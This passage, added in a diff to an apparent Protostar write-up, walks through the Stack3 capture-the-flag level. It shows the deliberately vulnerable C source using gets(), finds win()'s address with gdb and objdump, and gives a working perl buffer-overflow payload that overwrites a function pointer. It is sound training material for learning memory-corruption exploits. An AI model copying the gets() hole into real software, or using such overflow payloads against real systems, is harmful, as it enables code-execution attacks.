@@ -332,3 +332,83 @@ user@protostar:/opt/protostar/bin$ ./stack2
 you have correctly modified the variable
 ```
 
+We solved it :D
+
+
+## Stack 3
+
+### Challenge description
+
+Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
+
+Hints
+
++ both gdb and objdump is your friend you determining where the win() function lies in memory.
+
+This level is at `/opt/protostar/bin/stack3`
+
+### Challenge source code
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+```
+
+### Challenge solution
+
+This is getting interesting !
+
+We are provided with a `win` function, and we need to jump to it.
+
+Since `win` is just an address in the memory, we can set `fp` to point to `win` if we know its address.
+
+To determine the address of `win`, we can use gdb.
+
+
+```bash
+user@protostar:/opt/protostar/bin$ gdb ./stack3
+(gdb) p win
+$1 = {void (void)} 0x8048424 <win>
+```
+
+We can use `objdump` as well.
+
+```bash
+user@protostar:/opt/protostar/bin$ objdump -t ./stack3 | grep win
+08048424 g     F .text  00000014              win
+```
+
+We got the address : `0x8048424`
+
+Now let's use the same technique as earlier.
+
+
+```bash
+user@protostar:/opt/protostar/bin$ perl -e 'print "A" x 64 . "\x24\x84\x04\x08"' | ./stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+```
+
+We solved it :D
